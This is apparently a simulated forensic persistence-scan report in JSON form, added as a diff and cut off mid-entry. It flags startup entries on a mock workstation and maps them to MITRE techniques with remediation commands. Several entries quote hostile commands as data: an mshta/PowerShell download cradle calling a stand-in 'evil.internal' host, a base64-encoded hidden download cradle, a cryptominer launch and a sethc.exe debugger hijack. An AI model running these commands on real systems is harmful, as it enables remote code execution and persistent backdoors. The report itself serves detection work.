@@ -1,0 +1,1463 @@
+{
+  "report_id": "FAR-8236E912",
+  "scan_timestamp": "2026-10-03 19:03:32 UTC",
+  "host_name": "SIMULATED-CORP-WORKSTATION",
+  "os_version": "Windows 10 (10.0.22631)",
+  "target_user": "TargetUser (APT29 Simulation)",
+  "duration_seconds": 0.26,
+  "total_analyzed": 9,
+  "critical_count": 5,
+  "high_count": 0,
+  "medium_count": 1,
+  "low_count": 0,
+  "clean_count": 3,
+  "overall_risk_score": 100,
+  "overall_risk_level": "CRITICAL",
+  "category_summary": {
+    "Registry Run": 3,
+    "WMI Event Consumer": 1,
+    "Startup Folder (LNK/Binary)": 1,
+    "Scheduled Task": 1,
+    "Image File Execution Options (IFEO)": 1,
+    "Windows Service": 1,
+    "Winlogon Persistence": 1
+  },
+  "mitre_summary": {
+    "T1036.005": [
+      "WinAudioHelper",
+      "Startup File: Q3_Financial_Audit_Report.pdf.exe"
+    ],
+    "T1547.001": [
+      "WinAudioHelper",
+      "Startup File: Q3_Financial_Audit_Report.pdf.exe"
+    ],
+    "T1027.002": [
+      "WinAudioHelper",
+      "Startup File: Q3_Financial_Audit_Report.pdf.exe"
+    ],
+    "T1055": [
+      "WinAudioHelper",
+      "IFEO Hijack: sethc.exe"
+    ],
+    "T1059.001": [
+      "WMI Subscription: SystemHealthSync",
+      "Task: WindowsDefenderTelemetryUpdate"
+    ],
+    "T1218": [
+      "WMI Subscription: SystemHealthSync",
+      "Task: WindowsDefenderTelemetryUpdate"
+    ],
+    "T1546.003": [
+      "WMI Subscription: SystemHealthSync"
+    ],
+    "T1070.006": [
+      "Startup File: Q3_Financial_Audit_Report.pdf.exe",
+      "Task: WindowsDefenderTelemetryUpdate",
+      "IFEO Hijack: sethc.exe"
+    ],
+    "T1546.012": [
+      "IFEO Hijack: sethc.exe"
+    ],
+    "T1574.009": [
+      "Service: Custom Cloud Enterprise Agent"
+    ]
+  },
+  "entries": [
+    {
+      "entry_id": "d701c326",
+      "name": "WinAudioHelper",
+      "category": "Registry Run",
+      "location": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "raw_command": "\"C:\\Users\\Public\\svchost.exe\" --background --stratum=pool.minexmr.com:4444",
+      "resolved_path": "C:\\Users\\Public\\svchost.exe",
+      "arguments": "--background --stratum=pool.minexmr.com:4444",
+      "enabled": true,
+      "user_context": "HKCU",
+      "timestamp_discovered": "2026-10-03T19:03:32.501877",
+      "signature": {
+        "is_signed": false,
+        "status": "NotSigned",
+        "signer_name": "",
+        "issuer_name": "",
+        "is_trusted_publisher": false,
+        "serial_number": null,
+        "timestamp": null
+      },
+      "file_info": {
+        "file_path": "C:\\Users\\Public\\svchost.exe",
+        "exists": true,
+        "file_size": 1428480,
+        "md5": "e4d909c290d0fb1ca068ffaddf22cbd0",
+        "sha1": "3b71f43ff30f4b15b5cd85d600d810913f3cb863",
+        "sha256": "8f4e2b01c34a9b58210f92b7405df6248d21b926487e42d743a196e481283c9a",
+        "entropy": 7.86,
+        "is_high_entropy": true,
+        "compile_time": "2026-08-12 04:12:00 UTC",
+        "subsystem": "Windows Console",
+        "imphash": "a1b2c3d4e5f60718293a4b5c6d7e8f90",
+        "file_description": null,
+        "company_name": "Microsoft Corporation",
+        "product_name": null,
+        "original_filename": null,
+        "sections": [],
+        "imports_sample": [],
+        "anomalies": [
+          "Known packer/crypter section identified: '.upx0'",
+          "Section '.upx1' exhibits extremely high entropy (7.92)",
+          "Suspicious API imports detected: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread"
+        ]
+      },
+      "findings": [
+        {
+          "rule_id": "RULE_MASQUERADING_SYSTEM",
+          "rule_name": "Critical System Process Masquerading",
+          "score_impact": 50,
+          "severity": "CRITICAL",
+          "description": "Binary is masquerading as legitimate Windows system file 'svchost.exe' but executes from unauthorized path 'C:\\Users\\Public\\svchost.exe'.",
+          "mitre_attack_id": "T1036.005",
+          "mitre_tactic": "Defense Evasion (TA0005)",
+          "mitre_technique": "Masquerading: Match Legitimate Name or Location",
+          "remediation_advice": "Cross-reference binary file paths against known Windows system paths; verify Authenticode digital signatures against Microsoft trusted roots."
+        },
+        {
+          "rule_id": "RULE_SUSPICIOUS_PATH",
+          "rule_name": "Suspicious Writable Execution Directory",
+          "score_impact": 35,
+          "severity": "HIGH",
+          "description": "Startup program executes from a high-risk volatile or user-writable directory matching '\\users\\public'.",
+          "mitre_attack_id": "T1547.001",
+          "mitre_tactic": "Persistence (TA0003)",
+          "mitre_technique": "Registry Run Keys / Startup Folder",
+          "remediation_advice": "Investigate binary provenance, check write permissions, and remove unauthorized startup entry."
+        },
+        {
+          "rule_id": "RULE_UNSIGNED_STARTUP_ENTRY",
+          "rule_name": "Unsigned Startup Executable",
+          "score_impact": 20,
+          "severity": "LOW",
+          "description": "Startup entry 'WinAudioHelper' does not possess an Authenticode digital signature.",
+          "mitre_attack_id": "T1547.001",
+          "mitre_tactic": "Persistence (TA0003)",
+          "mitre_technique": "Registry Run Keys / Startup Folder",
+          "remediation_advice": "Review publisher and verify executable authenticity."
+        },
+        {
+          "rule_id": "RULE_HIGH_ENTROPY_PACKED",
+          "rule_name": "High Shannon Entropy (7.86) / Packed Binary",
+          "score_impact": 30,
+          "severity": "HIGH",
+          "description": "File exhibits high Shannon entropy of 7.86/8.0, characteristic of packed malware, crypters, or encrypted shellcode.",
+          "mitre_attack_id": "T1027.002",
+          "mitre_tactic": "Defense Evasion (TA0005)",
+          "mitre_technique": "Software Packing / High Entropy Payload",
+          "remediation_advice": "Employ automated unpackers and memory scanning; monitor for sudden memory allocation with PAGE_EXECUTE_READWRITE."
+        },
+        {
+          "rule_id": "RULE_KNOWN_PACKER_SECTION",
+          "rule_name": "Known Packer / Crypter Section Detected",
+          "score_impact": 30,
+          "severity": "HIGH",
+          "description": "Known packer/crypter section identified: '.upx0'",
+          "mitre_attack_id": "T1027.002",
+          "mitre_tactic": "Defense Evasion (TA0005)",
+          "mitre_technique": "Software Packing / High Entropy Payload",
+          "remediation_advice": "Employ automated unpackers and memory scanning; monitor for sudden memory allocation with PAGE_EXECUTE_READWRITE."
+        },
+        {
+          "rule_id": "RULE_SUSPICIOUS_API_IMPORTS",
+          "rule_name": "Suspicious Injection / Memory APIs",
+          "score_impact": 20,
+          "severity": "MEDIUM",
+          "description": "Suspicious API imports detected: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread",
+          "mitre_attack_id": "T1055",
+          "mitre_tactic": "Privilege Escalation (TA0004)",
+          "mitre_technique": "Process Injection",
+          "remediation_advice": "Perform dynamic behavioral analysis in sandbox environment."
+        },
+        {
+          "rule_id": "RULE_METADATA_IMPERSONATION",
+          "rule_name": "Corporate Metadata Impersonation",
+          "score_impact": 35,
+          "severity": "HIGH",
+          "description": "File claims CompanyName 'Microsoft Corporation' in metadata but lacks a valid digital signature from that entity.",
+          "mitre_attack_id": "T1036.005",
+          "mitre_tactic": "Defense Evasion (TA0005)",
+          "mitre_technique": "Masquerading: Match Legitimate Name or Location",
+          "remediation_advice": "Cross-reference binary file paths against known Windows system paths; verify Authenticode digital signatures against Microsoft trusted roots."
+        }
+      ],
+      "total_score": 100,
+      "severity": "CRITICAL",
+      "remediation_command": "Remove-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"WinAudioHelper\""
+    },
+    {
+      "entry_id": "1962f578",
+      "name": "WMI Subscription: SystemHealthSync",
+      "category": "WMI Event Consumer",
+      "location": "root\\subscription\\CommandLineEventConsumer (SystemHealthSync)",
+      "raw_command": "mshta.exe javascript:a=new(ActiveXObject)('WScript.Shell');a.Run('powershell -nop -c IEX(New-Object Net.WebClient).DownloadString(\\'http://evil.internal/sync.hta\\')',0);window.close()",
+      "resolved_path": "C:\\Windows\\System32\\mshta.exe",
+      "arguments": "javascript:a=new...",
+      "enabled": true,
+      "user_context": "NT AUTHORITY\\SYSTEM (WMI Provider)",
+      "timestamp_discovered": "2026-10-03T19:03:32.501877",
+      "signature": {
+        "is_signed": true,
+        "status": "Valid",
+        "signer_name": "Microsoft Windows",
+        "issuer_name": "Microsoft Root Certificate Authority 2010",
+        "is_trusted_publisher": true,
+        "serial_number": null,
+        "timestamp": null
+      },
+      "file_info": {
+        "file_path": "C:\\Windows\\System32\\mshta.exe",
+        "exists": true,
+        "file_size": 32768,
+        "md5": "36d15dde6d71802d9588cc0d48edf8ea",
+        "sha1": "6faf6bb6b8dabfedc1b40926801144ac95ded2a0",
+        "sha256": "7b70b26081cfa5fae721f6e0a63960034d25cc94d157cd649a4e9907b5af37ea",
+        "entropy": 2.4653,
+        "is_high_entropy": false,
+        "compile_time": "2021-03-25 14:02:01 UTC",
+        "subsystem": "Windows GUI",
+        "imphash": "dcdee2ff2311b9ae7c4d768fa56524dd",
+        "file_description": "Microsoft (R) HTML Application host",
+        "company_name": "Microsoft Corporation",
+        "product_name": "Internet Explorer",
+        "original_filename": "MSHTA.EXE",
+        "sections": [
+          {
+            "name": ".text",
+            "virtual_size": 3488,
+            "raw_size": 4096,
+            "entropy": 5.3956
+          },
+          {
+            "name": ".rdata",
+            "virtual_size": 3468,
+            "raw_size": 4096,
+            "entropy": 3.7969
+          },
+          {
+            "name": ".data",
+            "virtual_size": 1664,
+            "raw_size": 4096,
+            "entropy": 0.0487
+          },
+          {
+            "name": ".pdata",
+            "virtual_size": 228,
+            "raw_size": 4096,
+            "entropy": 0.3231
+          },
+          {
+            "name": ".rsrc",
+            "virtual_size": 4792,
+            "raw_size": 8192,
+            "entropy": 2.8058
+          },
+          {
+            "name": ".reloc",
+            "virtual_size": 48,
+            "raw_size": 4096,
+            "entropy": 0.1161
+          }
+        ],
+        "imports_sample": [],
+        "anomalies": []
+      },
+      "findings": [
+        {
+          "rule_id": "RULE_OBFUSCATED_CMDLINE",
+          "rule_name": "Obfuscated Command: Remote Web Download Cradle",
+          "score_impact": 45,
+          "severity": "CRITICAL",
+          "description": "Command line utilizes stealth or obfuscation techniques: Remote Web Download Cradle in command string.",
+          "mitre_attack_id": "T1059.001",
+          "mitre_tactic": "Execution (TA0002)",
+          "mitre_technique": "Command and Scripting Interpreter: PowerShell",
+          "remediation_advice": "Enable PowerShell Script Block Logging (Event ID 4104), Transcription Logging, and Constrained Language Mode."
+        },
+        {
+          "rule_id": "RULE_LOLBIN_EXECUTION",
+          "rule_name": "Living-Off-The-Land Binary (mshta.exe)",
+          "score_impact": 25,
+          "severity": "MEDIUM",
+          "description": "Startup persistence leverages native system utility 'mshta.exe' to proxy script or command execution.",
+          "mitre_attack_id": "T1218",
+          "mitre_tactic": "Defense Evasion (TA0005)",
+          "mitre_technique": "System Binary Proxy Execution",
+          "remediation_advice": "Block or monitor proxy execution of mshta.exe, certutil.exe, regsvr32.exe, rundll32.exe via Windows Defender Application Control (WDAC)."
+        },
+        {
+          "rule_id": "RULE_WMI_PERSISTENCE",
+          "rule_name": "WMI Event Subscription Persistence",
+          "score_impact": 35,
+          "severity": "HIGH",
+          "description": "Persistent WMI Event Consumer triggers command on system events in 'root\\subscription\\CommandLineEventConsumer (SystemHealthSync)'.",
+          "mitre_attack_id": "T1546.003",
+          "mitre_tactic": "Persistence (TA0003)",
+          "mitre_technique": "Event Triggered Execution: WMI Event Subscription",
+          "remediation_advice": "Inspect root\\subscription namespace for unauthorized CommandLineEventConsumer or ActiveScriptEventConsumer; enable Microsoft-Windows-WMI-Activity/Operational logs."
+        }
+      ],
+      "total_score": 100,
+      "severity": "CRITICAL",
+      "remediation_command": "Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter \"Name='SystemHealthSync'\" | Remove-CimInstance"
+    },
+    {
+      "entry_id": "e744a548",
+      "name": "Startup File: Q3_Financial_Audit_Report.pdf.exe",
+      "category": "Startup Folder (LNK/Binary)",
+      "location": "User Startup Folder (C:\\Users\\TargetUser\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Q3_Financial_Audit_Report.pdf.exe)",
+      "raw_command": "C:\\Users\\TargetUser\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Q3_Financial_Audit_Report.pdf.exe",
+      "resolved_path": "C:\\Users\\TargetUser\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Q3_Financial_Audit_Report.pdf.exe",
+      "arguments": "",
+      "enabled": true,
+      "user_context": "HKCU",
+      "timestamp_discovered": "2026-10-03T19:03:32.501877",
+      "signature": {
+        "is_signed": false,
+        "status": "NotSigned",
+        "signer_name": "",
+        "issuer_name": "",
+        "is_trusted_publisher": false,
+        "serial_number": null,
+        "timestamp": null
+      },
+      "file_info": {
+        "file_path": "C:\\Users\\TargetUser\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Q3_Financial_Audit_Report.pdf.exe",
+        "exists": true,
+        "file_size": 834560,
+        "md5": "5d41402abc4b2a76b9719d911017c592",
+        "sha1": "",
+        "sha256": "4cf8291a84f38d6f72576315804537b04f56f1008263da10240f471edd2f8605",
+        "entropy": 7.68,
+        "is_high_entropy": true,
+        "compile_time": null,
+        "subsystem": null,
+        "imphash": null,
+        "file_description": null,
+        "company_name": null,
+        "product_name": null,
+        "original_filename": null,
+        "sections": [],
+        "imports_sample": [],
+        "anomalies": [
+          "Timestomping anomaly: Ancient compile timestamp (1970-01-01 00:00:00 UTC)"
+        ]
+      },
+      "findings": [
+        {
+          "rule_id": "RULE_DOUBLE_EXTENSION",
+          "rule_name": "Deceptive Double File Extension",
+          "score_impact": 45,
+          "severity": "CRITICAL",
+          "description": "Binary uses deceptive double extension 'q3_financial_audit_report.pdf.exe' to disguise executable as document/image.",
+          "mitre_attack_id": "T1036.005",
+          "mitre_tactic": "Defense Evasion (TA0005)",
+          "mitre_technique": "Masquerading: Match Legitimate Name or Location",
+          "remediation_advice": "Immediately quarantine the executable and check origin phishing vectors."
+        },
+        {
+          "rule_id": "RULE_UNSIGNED_STARTUP_ENTRY",
+          "rule_name": "Unsigned Startup Executable",
+          "score_impact": 20,
+          "severity": "LOW",
+          "description": "Startup entry 'Startup File: Q3_Financial_Audit_Report.pdf.exe' does not possess an Authenticode digital signature.",
+          "mitre_attack_id": "T1547.001",
+          "mitre_tactic": "Persistence (TA0003)",
+          "mitre_technique": "Registry Run Keys / Startup Folder",
+          "remediation_advice": "Review publisher and verify executable authenticity."
+        },
+        {
+          "rule_id": "RULE_HIGH_ENTROPY_PACKED",
+          "rule_name": "High Shannon Entropy (7.68) / Packed Binary",
+          "score_impact": 30,
+          "severity": "HIGH",
+          "description": "File exhibits high Shannon entropy of 7.68/8.0, characteristic of packed malware, crypters, or encrypted shellcode.",
+          "mitre_attack_id": "T1027.002",
+          "mitre_tactic": "Defense Evasion (TA0005)",
+          "mitre_technique": "Software Packing / High Entropy Payload",
+          "remediation_advice": "Employ automated unpackers and memory scanning; monitor for sudden memory allocation with PAGE_EXECUTE_READWRITE."
+        },
+        {
+          "rule_id": "RULE_TIMESTOMPING_ANOMALY",
+          "rule_name": "Timestomping Timestamp Anomaly",
+          "score_impact": 25,
+          "severity": "MEDIUM",
+          "description": "Timestomping anomaly: Ancient compile timestamp (1970-01-01 00:00:00 UTC)",
+          "mitre_attack_id": "T1070.006",
+          "mitre_tactic": "Defense Evasion (TA0005)",
+          "mitre_technique": "Indicator Removal: Timestomp",
+          "remediation_advice": "Compare PE compile header timestamp against NTFS Master File Table ($MFT) $STANDARD_INFORMATION and $FILE_NAME timestamps."
+        }
+      ],
+      "total_score": 100,
+      "severity": "CRITICAL",
+      "remediation_command": "Remove-Item -Path \"C:\\Users\\TargetUser\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Q3_Financial_Audit_Report.pdf.exe\" -Force"
+    },
+    {
+      "entry_id": "c98f122a",
+      "name": "Task: WindowsDefenderTelemetryUpdate",
+      "category": "Scheduled Task",
+      "location": "Tasks\\Microsoft\\Windows\\Maintenance\\TelemetryUpdate",
+      "raw_command": "powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AcwB5AHMAdABlAG0ALQB1AHAAZABhAHQAZQBzAC4AdABvAHAvAGIAZQBhAGMAbwBuAC4AcABzADEAJwApAA==",
+      "resolved_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "arguments": "-w hidden -enc SQBFAFgAIAAo...",
+      "enabled": true,
+      "user_context": "NT AUTHORITY\\SYSTEM (At System Startup)",
+      "timestamp_discovered": "2026-10-03T19:03:32.501877",
+      "signature": {
+        "is_signed": true,
+        "status": "Valid",
+        "signer_name": "Microsoft Windows",
+        "issuer_name": "Microsoft Root Certificate Authority 2010",
+        "is_trusted_publisher": true,
+        "serial_number": null,
+        "timestamp": null
+      },
+      "file_info": {
+        "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "exists": true,
+        "file_size": 450560,
+        "md5": "9d8e30daf21108092d5980c931876b7e",
+        "sha1": "7c04ec2377e32b3c7742f581f6c5437464dd2cf2",
+        "sha256": "3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8",
+        "entropy": 5.3938,
+        "is_high_entropy": false,
+        "compile_time": "1974-07-29 16:18:42 UTC",
+        "subsystem": "Windows Console",
+        "imphash": "afacf6dc9041114b198160aab4d0ae77",
+        "file_description": "Windows PowerShell",
+        "company_name": "Microsoft Corporation",
+        "product_name": "Microsoft\u00ae Windows\u00ae Operating System",
+        "original_filename": "PowerShell.EXE",
+        "sections": [
+          {
+            "name": ".text",
+            "virtual_size": 40022,
+            "raw_size": 40960,
+            "entropy": 6.118
+          },
+          {
+            "name": ".rdata",
+            "virtual_size": 30748,
+            "raw_size": 32768,
+            "entropy": 4.1135
+          },
+          {
+            "name": ".data",
+            "virtual_size": 3970,
+            "raw_size": 4096,
+            "entropy": 1.7383
+          },
+          {
+            "name": ".pdata",
+            "virtual_size": 2568,
+            "raw_size": 4096,
+            "entropy": 3.4176
+          },
+          {
+            "name": ".rsrc",
+            "virtual_size": 359816,
+            "raw_size": 360448,
+            "entropy": 5.3002
+          },
+          {
+            "name": ".reloc",
+            "virtual_size": 952,
+            "raw_size": 4096,
+            "entropy": 1.966
+          }
+        ],
+        "imports_sample": [],
+        "anomalies": [
+          "Timestomping anomaly: Ancient compile timestamp (1974-07-29 16:18:42 UTC)"
+        ]
+      },
+      "findings": [
+        {
+          "rule_id": "RULE_OBFUSCATED_CMDLINE",
+          "rule_name": "Obfuscated Command: Base64 Encoded PowerShell Command (-enc)",
+          "score_impact": 45,
+          "severity": "CRITICAL",
+          "description": "Command line utilizes stealth or obfuscation techniques: Base64 Encoded PowerShell Command (-enc) in command string.",
+          "mitre_attack_id": "T1059.001",
+          "mitre_tactic": "Execution (TA0002)",
+          "mitre_technique": "Command and Scripting Interpreter: PowerShell",
+          "remediation_advice": "Enable PowerShell Script Block Logging (Event ID 4104), Transcription Logging, and Constrained Language Mode."
+        },
+        {
+          "rule_id": "RULE_LOLBIN_EXECUTION",
+          "rule_name": "Living-Off-The-Land Binary (powershell.exe)",
+          "score_impact": 25,
+          "severity": "MEDIUM",
+          "description": "Startup persistence leverages native system utility 'powershell.exe' to proxy script or command execution.",
+          "mitre_attack_id": "T1218",
+          "mitre_tactic": "Defense Evasion (TA0005)",
+          "mitre_technique": "System Binary Proxy Execution",
+          "remediation_advice": "Block or monitor proxy execution of mshta.exe, certutil.exe, regsvr32.exe, rundll32.exe via Windows Defender Application Control (WDAC)."
+        },
+        {
+          "rule_id": "RULE_TIMESTOMPING_ANOMALY",
+          "rule_name": "Timestomping Timestamp Anomaly",
+          "score_impact": 25,
+          "severity": "MEDIUM",
+          "description": "Timestomping anomaly: Ancient compile timestamp (1974-07-29 16:18:42 UTC)",
+          "mitre_attack_id": "T1070.006",
+          "mitre_tactic": "Defense Evasion (TA0005)",
+          "mitre_technique": "Indicator Removal: Timestomp",
+          "remediation_advice": "Compare PE compile header timestamp against NTFS Master File Table ($MFT) $STANDARD_INFORMATION and $FILE_NAME timestamps."
+        }
+      ],
+      "total_score": 95,
+      "severity": "CRITICAL",
+      "remediation_command": "Unregister-ScheduledTask -TaskName \"\\Microsoft\\Windows\\Maintenance\\TelemetryUpdate\" -Confirm:$false"
+    },
+    {
+      "entry_id": "7d45aafc",
+      "name": "IFEO Hijack: sethc.exe",
+      "category": "Image File Execution Options (IFEO)",
+      "location": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger",
+      "raw_command": "C:\\Windows\\System32\\cmd.exe",
+      "resolved_path": "C:\\Windows\\System32\\cmd.exe",
+      "arguments": "",
+      "enabled": true,
+      "user_context": "HKLM (System-wide)",
+      "timestamp_discovered": "2026-10-03T19:03:32.501877",
+      "signature": {
+        "is_signed": true,
+        "status": "Valid",
+        "signer_name": "Microsoft Windows",
+        "issuer_name": "Microsoft Root Certificate Authority 2010",
+        "is_trusted_publisher": true,
+        "serial_number": null,
+        "timestamp": null
+      },
+      "file_info": {
+        "file_path": "C:\\Windows\\System32\\cmd.exe",
+        "exists": true,
+        "file_size": 327680,
+        "md5": "7620f0bc3228fe019a6bd8c593c1d856",
+        "sha1": "94bdaeb55589339baed714f681b4690109ebf7fe",
+        "sha256": "a6e3b3b22b7fe8ce2c9245816126723eaa13f43b9f591883e59959a2d409426a",
+        "entropy": 5.9486,
+        "is_high_entropy": false,
+        "compile_time": "2040-02-04 06:33:47 UTC",
+        "subsystem": "Windows Console",
+        "imphash": "139e6eec8cbbc5562c4a148515c0146c",
+        "file_description": "Windows Command Processor",
+        "company_name": "Microsoft Corporation",
+        "product_name": "Microsoft\u00ae Windows\u00ae Operating System",
+        "original_filename": "Cmd.Exe",
+        "sections": [
+          {
+            "name": ".text",
+            "virtual_size": 220525,
+            "raw_size": 221184,
+            "entropy": 6.3367
+          },
+          {
+            "name": ".rdata",
+            "virtual_size": 40352,
+            "raw_size": 40960,
+            "entropy": 4.989
+          },
+          {
+            "name": ".data",
+            "virtual_size": 114248,
+            "raw_size": 4096,
+            "entropy": 0.5424
+          },
+          {
+            "name": ".pdata",
+            "virtual_size": 9840,
+            "raw_size": 12288,
+            "entropy": 4.7503
+          },
+          {
+            "name": ".didat",
+            "virtual_size": 168,
+            "raw_size": 4096,
+            "entropy": 0.2175
+          },
+          {
+            "name": ".rsrc",
+            "virtual_size": 34040,
+            "raw_size": 36864,
+            "entropy": 4.1223
+          },
+          {
+            "name": ".reloc",
+            "virtual_size": 476,
+            "raw_size": 4096,
+            "entropy": 1.0271
+          }
+        ],
+        "imports_sample": [
+          "IsDebuggerPresent"
+        ],
+        "anomalies": [
+          "Timestomping anomaly: Compile timestamp is in the future (2040-02-04 06:33:47 UTC)",
+          "Suspicious API imports detected: IsDebuggerPresent"
+        ]
+      },
+      "findings": [
+        {
+          "rule_id": "RULE_IFEO_DEBUGGER_HIJACK",
+          "rule_name": "Image File Execution Options (IFEO) Hijack",
+          "score_impact": 50,
+          "severity": "CRITICAL",
+          "description": "Debugger registry key intercepts target binary execution via 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger'.",
+          "mitre_attack_id": "T1546.012",
+          "mitre_tactic": "Persistence (TA0003)",
+          "mitre_technique": "Event Triggered Execution: Image File Execution Options",
+          "remediation_advice": "Audit 'HKLM\\...\\Image File Execution Options' for unauthorized 'Debugger' keys; enable Sysmon Event ID 12/13 monitoring."
+        },
+        {
+          "rule_id": "RULE_TIMESTOMPING_ANOMALY",
+          "rule_name": "Timestomping Timestamp Anomaly",
+          "score_impact": 25,
+          "severity": "MEDIUM",
+          "description": "Timestomping anomaly: Compile timestamp is in the future (2040-02-04 06:33:47 UTC)",
+          "mitre_attack_id": "T1070.006",
+          "mitre_tactic": "Defense Evasion (TA0005)",
+          "mitre_technique": "Indicator Removal: Timestomp",
+          "remediation_advice": "Compare PE compile header timestamp against NTFS Master File Table ($MFT) $STANDARD_INFORMATION and $FILE_NAME timestamps."
+        },
+        {
+          "rule_id": "RULE_SUSPICIOUS_API_IMPORTS",
+          "rule_name": "Suspicious Injection / Memory APIs",
+          "score_impact": 20,
+          "severity": "MEDIUM",
+          "description": "Suspicious API imports detected: IsDebuggerPresent",
+          "mitre_attack_id": "T1055",
+          "mitre_tactic": "Privilege Escalation (TA0004)",
+          "mitre_technique": "Process Injection",
+          "remediation_advice": "Perform dynamic behavioral analysis in sandbox environment."
+        }
+      ],
+      "total_score": 95,
+      "severity": "CRITICAL",
+      "remediation_command": "Remove-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" -Name \"Debugger\""
+    },
+    {
+      "entry_id": "92da039e",
+      "name": "Service: Custom Cloud Enterprise Agent",
+      "category": "Windows Service",
+      "location": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\CloudAgent",
+      "raw_command": "C:\\Program Files\\Enterprise Cloud Agent\\service\\agent_service.exe --start",
+      "resolved_path": "C:\\Program Files\\Enterprise Cloud Agent\\service\\agent_service.exe",
+      "arguments": "--start",
+      "enabled": true,
+      "user_context": "LocalSystem (Auto Start)",
+      "timestamp_discovered": "2026-10-03T19:03:32.501877",
+      "signature": {
+        "is_signed": false,
+        "status": "NotSigned",
+        "signer_name": "",
+        "issuer_name": "",
+        "is_trusted_publisher": false,
+        "serial_number": null,
+        "timestamp": null
+      },
+      "file_info": {
+        "file_path": "C:\\Program Files\\Enterprise Cloud Agent\\service\\agent_service.exe",
+        "exists": true,
+        "file_size": 512000,
+        "md5": "",
+        "sha1": "",
+        "sha256": "",
+        "entropy": 6.12,
+        "is_high_entropy": false,
+        "compile_time": "2025-11-04 10:15:00 UTC",
+        "subsystem": "Windows Console",
+        "imphash": null,
+        "file_description": null,
+        "company_name": null,
+        "product_name": null,
+        "original_filename": null,
+        "sections": [],
+        "imports_sample": [],
+        "anomalies": []
+      },
+      "findings": [
+        {
+          "rule_id": "RULE_UNQUOTED_SERVICE_PATH",
+          "rule_name": "Unquoted Service Path Vulnerability",
+          "score_impact": 20,
+          "severity": "MEDIUM",
+          "description": "Service binary path 'C:\\Program Files\\Enterprise Cloud Agent\\service\\agent_service.exe --start' contains spaces without quotation marks, creating local privilege escalation vulnerability.",
+          "mitre_attack_id": "T1574.009",
+          "mitre_tactic": "Privilege Escalation (TA0004)",
+          "mitre_technique": "Hijack Execution Flow: Path Interception by Unquoted Path",
+          "remediation_advice": "Ensure all service binary paths with whitespace are enclosed in quotation marks in the registry."
+        }
+      ],
+      "total_score": 20,
+      "severity": "MEDIUM",
+      "remediation_command": "Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\CloudAgent\" -Name \"ImagePath\" -Value '\"C:\\Program Files\\Enterprise Cloud Agent\\service\\agent_service.exe\" --start'"
+    },
+    {
+      "entry_id": "6478d2ba",
+      "name": "GoogleChromeAutoLaunch",
+      "category": "Registry Run",
+      "location": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "raw_command": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --no-startup-window /prefetch:5",
+      "resolved_path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "arguments": "--no-startup-window /prefetch:5",
+      "enabled": true,
+      "user_context": "HKCU",
+      "timestamp_discovered": "2026-10-03T19:03:32.501877",
+      "signature": {
+        "is_signed": true,
+        "status": "Valid",
+        "signer_name": "CN=Google LLC, O=Google LLC, L=Mountain View, S=California, C=US",
+        "issuer_name": "DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1",
+        "is_trusted_publisher": true,
+        "serial_number": null,
+        "timestamp": null
+      },
+      "file_info": {
+        "file_path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+        "exists": true,
+        "file_size": 3245056,
+        "md5": "",
+        "sha1": "",
+        "sha256": "",
+        "entropy": 6.45,
+        "is_high_entropy": false,
+        "compile_time": null,
+        "subsystem": null,
+        "imphash": null,
+        "file_description": null,
+        "company_name": "Google LLC",
+        "product_name": "Google Chrome",
+        "original_filename": null,
+        "sections": [],
+        "imports_sample": [],
+        "anomalies": []
+      },
+      "findings": [],
+      "total_score": 0,
+      "severity": "CLEAN",
+      "remediation_command": "Remove-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"GoogleChromeAutoLaunch\""
+    },
+    {
+      "entry_id": "61ebba8a",
+      "name": "OneDrive",
+      "category": "Registry Run",
+      "location": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "raw_command": "\"C:\\Users\\TargetUser\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background",
+      "resolved_path": "C:\\Users\\TargetUser\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe",
+      "arguments": "/background",
+      "enabled": true,
+      "user_context": "HKCU",
+      "timestamp_discovered": "2026-10-03T19:03:32.501877",
+      "signature": {
+        "is_signed": true,
+        "status": "Valid",
+        "signer_name": "CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US",
+        "issuer_name": "Microsoft Corporation Third Party Marketplace Root",
+        "is_trusted_publisher": true,
+        "serial_number": null,
+        "timestamp": null
+      },
